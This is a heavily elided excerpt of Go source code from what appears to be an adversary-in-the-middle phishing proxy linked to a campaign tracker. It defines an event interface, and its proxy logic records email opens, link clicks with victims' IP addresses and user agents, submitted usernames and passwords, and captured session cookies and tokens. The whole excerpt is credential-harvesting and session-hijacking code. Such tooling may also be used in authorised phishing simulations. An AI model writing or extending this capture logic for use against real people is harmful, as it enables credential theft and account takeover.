...
type HttpProxy struct {
	...
	campaignEvents    CampaignEventSink
	bl                *Blacklist
...
// implementation owns campaign result updates outside the proxy state store.
type CampaignEventSink interface {
	HandleEmailOpened(string, map[string]string) error
	HandleClickedLink(string, map[string]string) error
	HandleSubmittedData(string, string, string, map[string]string) error
	HandleCapturedCookieSession(string, map[string]map[string]*database.CookieToken, map[string]string) error
	HandleCapturedOtherSession(string, map[string]string, map[string]string) error
}
							...
							if l != nil {
								...
								if err == nil {
									...
									if trackParam, ok := session.Params["o"]; ok {
										if trackParam == "track" {
											...
											if ok && rid != "" {
												...
												err := p.campaignEvents.HandleEmailOpened(rid, browser)
												if err != nil {
													log.Error("failed to add email opened event to database: %s", err)
												}
												log.Info("[olta-campaign] [%s] email opened: %s (%s)", hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
									...
									if ok && rid != "" {
										...
										browser := map[string]string{"address": req.RemoteAddr, "orig-address": from_ip, "user-agent": req.UserAgent()}
										session.Browser = browser
										err := p.campaignEvents.HandleClickedLink(rid, browser)
										if err != nil {
							...
							if pl.username.tp == "json" {
								...
								if um != nil && len(um) > 1 {
									...
									if len(session.RId) != 0 && len(session.Password) != 0 {
										err = p.campaignEvents.HandleSubmittedData(session.RId, session.Username, session.Password, session.Browser)
										if err != nil {
					...
					if !s.IsDone {
						...
						if err == nil {
							if s.CookieTokens != nil && len(s.CookieTokens) > 0 {
								err = p.campaignEvents.HandleCapturedCookieSession(s.RId, s.CookieTokens, s.Browser)
								if err != nil {
						...
						if err == nil {
							if s.BodyTokens != nil && len(s.BodyTokens) > 0 {
								err = p.campaignEvents.HandleCapturedOtherSession(s.RId, s.BodyTokens, s.Browser)
								if err != nil {
									fmt.Printf("Error adding captured session entry to database: %s\n", err)
								}
							}
						...
						if err == nil {
							if s.HttpTokens != nil && len(s.HttpTokens) > 0 {
								err = p.campaignEvents.HandleCapturedOtherSession(s.RId, s.HttpTokens, s.Browser)
								if err != nil {
									fmt.Printf("Error adding captured session entry to database: %s\n", err)
								}
							}
